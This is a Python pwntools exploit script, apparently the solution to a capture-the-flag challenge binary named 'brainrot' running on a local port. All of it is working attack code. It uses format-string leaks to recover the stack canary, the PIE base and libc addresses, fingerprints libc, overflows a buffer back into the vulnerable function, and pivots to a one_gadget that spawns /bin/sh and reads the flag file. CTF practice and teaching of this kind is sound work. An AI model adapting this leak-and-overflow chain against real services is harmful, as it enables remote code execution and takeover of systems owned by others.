#!/usr/bin/env python3
from pwn import *

HOST = "localhost"
PORT = 31337

context.terminal = ['tmux', 'new-window', '-F', '#{pane_pid}', '-P']


# Start the process as either local, gdb or remote
def start(binary_path):
    if args.LOCAL:
        p = process(binary_path)

        if args.GDB:
            gdbscript = """
            b *vuln+111
            continue
            """
            gdb.attach(p, gdbscript=gdbscript)

        return p

    return remote(HOST, PORT)


def get_libc_leak(binary_path):
    elf = context.binary = ELF(binary_path)
    p = start(elf.path)

    # +========================================================+
    # | Leak canary and pie base from the stack                |
    # +========================================================+
    log.info("Leaking canary and pie base")
    # Leak address from stack canary, pie base and libc base with printf
    p.sendlineafter(b"Enter your skibidi rizz name: ", b"%23$p|%25$p")  # CANARY|PIEBASE
    p.recvuntil(b"Wow that's some fanum taxing you got there ")

    # Separate <D-b>the leaks
    CANARY, pie_leak = [int(leak, 16) for leak in p.recvline().split(b"|")]

    # These values are taken without ASLR on. This is the distance between the 25th value on the
    # stack and the base on the binary (25th value - elf base)
    pie_offset = 0x555555555289 - 0x555555554000
    PIEBASE = elf.address = pie_leak - pie_offset

    log.success(f"CANARY:   {hex(CANARY)}")
    log.success(f"PIEBASE:  {hex(PIEBASE)}")

    # +========================================================+
    # | Return back to vuln                                    |
    # +========================================================+
    # Overflow description and return back to vuln so we can get the libc leak
    ret2vuln = flat(
        b"A" * 8,
        elf.got.printf,  # Get the location of printf in LIBC using GOT
        elf.got.puts,  # Get the location of puts in LIBC using GOT
        b"A" * 112,
        CANARY,  # Feed canary back to prevent program from exiting from stack smashing
        b"A" * 8,  # Extra padding to hit return pointer
        elf.sym.vuln  # Return to vuln
    )

    p.newline = b""  # Remove "\n" so printf will not terminate before issue format string
    p.sendlineafter(b"Gimme a rizz description of yourself", ret2vuln)
    p.newline = b"\n"

    # We can use %s to print the address as a string in the GOT because it uses indirect addressing
    p.sendlineafter(b"Enter your skibidi rizz name: ", b"%6$s|%7$s")  # PRINTF@GOT|PUTS@GOT
    p.recvuntil(b"Wow that's some fanum taxing you got there ")

    # Unpack from bytes to hex values. Uses ljust because printf stops printing after a null-byte.
    # So just ljust it to pad it until there are 6 bytes for u64
    LIBC_PRINTF, LIBC_PUTS = [
        u64(leak.ljust(8, b"\x00")) for leak in p.recvline().strip().split(b"|")
    ]

    log.success(f"PRINTF@LIBC: {hex(LIBC_PRINTF)}")
    log.success(f"PUTS@LIBC: {hex(LIBC_PUTS)}")

    # Find libc version in libcdb
    return libcdb.search_by_symbol_offsets({
        'printf': LIBC_PRINTF,
        'puts': LIBC_PUTS
    },
                                           select_index=1,
                                           unstrip=False)


def get_shell(binary_path, libc_path):
    elf = context.binary = ELF(binary_path)
    libc = ELF(libc_path, checksec=False)

    p = start(elf.path)

    # +========================================================+
    # | Leak canary and pie base from the stack                |
    # +========================================================+
    log.info("Leaking canary and pie base")
    # Leak address from stack canary, pie base and libc base with printf
    p.sendlineafter(b"Enter your skibidi rizz name: ", b"%23$p|%25$p")  # CANARY|PIEBASE
    p.recvuntil(b"Wow that's some fanum taxing you got there ")

    # Separate the leaks
    CANARY, pie_leak = [int(leak, 16) for leak in p.recvline().split(b"|")]

    # These values are taken without ASLR on. This is the distance between the 25th value on the
    # stack and the base on the binary (25th value - elf base)
    pie_offset = 0x555555555289 - 0x555555554000
    PIEBASE = elf.address = pie_leak - pie_offset

    log.success(f"CANARY:   {hex(CANARY)}")
    log.success(f"PIEBASE:  {hex(PIEBASE)}")

    # +========================================================+
    # | Return back to vuln                                    |
    # +========================================================+
    # Overflow description and return back to vuln so we can get the libc leak
    ret2vuln = flat(
        b"A" * 136,  # Get padding to overflow buffer
        CANARY,  # Feed canary back to prevent program from exiting from stack smashing
        b"A" * 8,  # Extra padding to hit return pointer
        elf.sym.vuln  # Return to vuln
    )

    p.newline = b""  # Remove "\n" so printf will not terminate before issue format string
    p.sendlineafter(b"Gimme a rizz description of yourself", ret2vuln)
    p.newline = b"\n"

    # +========================================================+
    # | Leak libc base from the stack                          |
    # +========================================================+
    log.info("Leaking libc base")
    # Leak address from stack canary, pie base and libc base with printf
    p.sendlineafter(b"Enter your skibidi rizz name: ", b"%26$p")  # LIBCBASE
    p.recvuntil(b"Wow that's some fanum taxing you got there ")

    # The 26th value on the stack is __libc_start_call_main+128. Subtract 128 from the leak to get
    # the value of __libc_start_call_main. Then subtract the offset of __libc_start_call_main from
    # the libc base to get libc base
    libc_leak = int(p.recvline(), 16)
    LIBCBASE = libc.address = libc_leak - 128 - libc.sym.__libc_start_call_main

    log.success(f"LIBCBASE: {hex(LIBCBASE)}")

    # +========================================================+
    # | Overflow return pointer with one_gadget                |
    # +========================================================+
    log.info("Overflow return pointer with one_gadget")
    # Overflow description and return back to vuln so we can rewrite the global variable name with
    # the one_gadget
    ret2onegadget = flat(
        b"A" * 136,  # Get padding to overflow buffer
        CANARY,  # Feed canary back to prevent program from exiting from stack smashing

        # Upon completion of the stack pivot, this 8 byte value will become RBP. Since the 2nd argument
        # of execve() is rbp-0x50, we need to add 0x50 to the address of the global variable name so
        # when it subtracts 0x50, it references the value of whatever is in name
        elf.sym.name + 0x50,

        # This is the one_gadget we will be using
        # 0xe35a9 execve("/bin/sh", rbp-0x50, r13)
        # constraints:
        #   address rbp-0x48 is writable
        #   r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
        #   [r13] == NULL || r13 == NULL || r13 is a valid envp

        # We will be pivoting the stack to the global variable to run our ROP. By writing the one_gadget
        # here, it will execute /bin/sh
        libc.address + 0xe35a9  # Location of one_gadget
    )

    p.sendlineafter(b"Gimme a rizz description of yourself", ret2onegadget)

    # +========================================================+
    # | Get shell!                                             |
    # +========================================================+
    log.success("Enjoy your shell!")
    p.clean()
    p.sendline(b"/bin/cat /home/pwn/flag.txt")
    log.success(p.recvline().strip().decode())
    p.interactive()


if __name__ == "__main__":
    libc = "./libc.so.6"
    binary = "./brainrot"
    binary_patched = "./brainrot_patched"

    if not os.path.exists(binary_patched):
        if args.LOCAL:
            raise Exception("Leaking LIBC Cannot be run in local environment")

        libc_path = get_libc_leak(binary)  # Must use remote session to work

        from shutil import copy
        copy(libc_path, libc)

        # Patch the binary
        _, stderr = subprocess.Popen(["pwninit", "--no-template", "--bin", binary, "--libc",
                                      libc]).communicate()

        if stderr:
            raise Exception(stderr)

    # Run again with patched binary
    get_shell(binary_patched, libc)
